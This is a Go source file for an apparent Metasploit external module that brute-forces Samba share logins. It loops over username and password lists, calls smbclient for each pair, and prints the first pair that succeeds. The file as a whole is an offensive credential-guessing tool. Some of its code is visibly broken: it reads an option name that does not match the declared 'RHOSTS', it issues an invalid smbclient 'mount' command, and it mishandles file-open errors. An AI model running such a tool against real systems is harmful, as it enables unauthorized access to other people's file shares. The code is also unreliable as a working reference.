package main

import (
    "bufio"
	"fmt"
	"log"
	"os"
    "os/exec"
	"os/user"
	"path/filepath"
    "github.com/rapid7/metasploit-framework/lib/msf/core/modules/external/go/src/metasploit/module"
	"github.com/nightlyone/lockfile"
)

func main() {
	metadata := &module.Metadata{
		Name: "enumerating usernames and passwords",
		Description: "try every combination of username and password provided on a samba share",
		Authors: []string{"<stephan>"},
		Date: "2023-06-11",
		Type:"single_scanner",
		Privileged:  false,
		References:  []module.Reference{},
		Options: map[string]module.Option{
			"RHOSTS": {Type: "string", Description: "Target endpoint", Required: true, Default: "localhost"},
			"RPATH":  {Type: "string", Description: "Path to file samba share", Required: false, Default: "share"},
			"USERNAMES":  {Type: "string", Description: "newline deliminated usernames", Required: false, Default: "usernames"},
			"PASSWORDS":  {Type: "string", Description: "newline deliminated passwords", Required: false, Default: "passwords"},
		},
	}
	module.Init(metadata,  enumerate_username_passwords)
}

func readfilenam(filePath string) []string {
    readFile, err := os.Open(filePath)

    if err != nil {
        fmt.Println(err)
    }
    fileScanner := bufio.NewScanner(readFile)
    fileScanner.Split(bufio.ScanLines)
    var fileLines []string

    for fileScanner.Scan() {
        fileLines = append(fileLines, fileScanner.Text())
    }

    readFile.Close()

	return fileLines
}


func getEnvironmentOrDefault(variable, dflt string) string {
	env := os.Getenv(variable)
	if env != "" {
		return env
	}
	return dflt
}


func enumerate_username_passwords(params map[string]interface{}) {
	usernameFile := params["USERNAMES"].(string)
	passwordFile := params["PASSWORDS"].(string)
	host := params["RHOST"].(string)
	path := params["RPATH"].(string)
	
	if usernameFile == "" || passwordFile == "" {
		module.LogError("Expected 'USERNAMES' or 'PASSWORDS' field to be populated")
		return
	}

	usernames := readfilenam(usernameFile)
	passwords := readfilenam(passwordFile)

	sharePath := fmt.Sprintf("\\\\%s\\%s", host, path)

	// Create a lock file to prevent multiple instances from accessing the share simultaneously
	lockfilePath := filepath.Join(os.TempDir(), "samba.lock")
	lock, err := lockfile.New(lockfilePath)
	if err != nil {
		log.Fatal(err)
	}
	defer lock.Unlock()

	// Acquire the lock
	err = lock.TryLock()
	if err != nil {
		log.Fatal("Another instance is already accessing the share.")
	}

	// Connect to the Samba share
	for _, username := range(usernames) {
		for _, password := range(passwords) {
			err = mountSambaShare(sharePath, username, password)
			if err != nil {
			} else {
				fmt.Printf("username: %s password: %s\n", username, password)
				os.Exit(0)
			}
		}
	}

	// No successfull connection made
	fmt.Printf("username password not in provided lists[%s][%s]\n", usernameFile, passwordFile)

	// Disconnect from the Samba share
	err = unmountSambaShare(sharePath)
	if err != nil {
		log.Fatal(err)
	}

	// Remove the lock file
	err = lock.Unlock()
	if err != nil {
		log.Fatal(err)
	}
}

func mountSambaShare(sharePath, username, password string) error {
	// Get the current user's home directory
	usr, err := user.Current()
	if err != nil {
		return err
	}
	homeDir := usr.HomeDir

	// Create the mount directory if it doesn't exist
	mountDir := filepath.Join(homeDir, "samba-mount")
	err = os.MkdirAll(mountDir, 0755)
	if err != nil {
		return err
	}

	// Mount the Samba share using the smbclient command
	cmd := exec.Command("smbclient", sharePath, "-U", username+"%"+password, "-c", "mount "+mountDir)
	err = cmd.Run()
	if err != nil {
		return err
	}

	fmt.Println("connected to samba share successfully.")

	return nil
}

func unmountSambaShare(sharePath string) error {
	// Unmount the Samba share using the smbclient command
	cmd := exec.Command("smbclient", sharePath, "-c", "umount")
	err := cmd.Run()
	if err != nil {
		return err
	}

	return nil
}
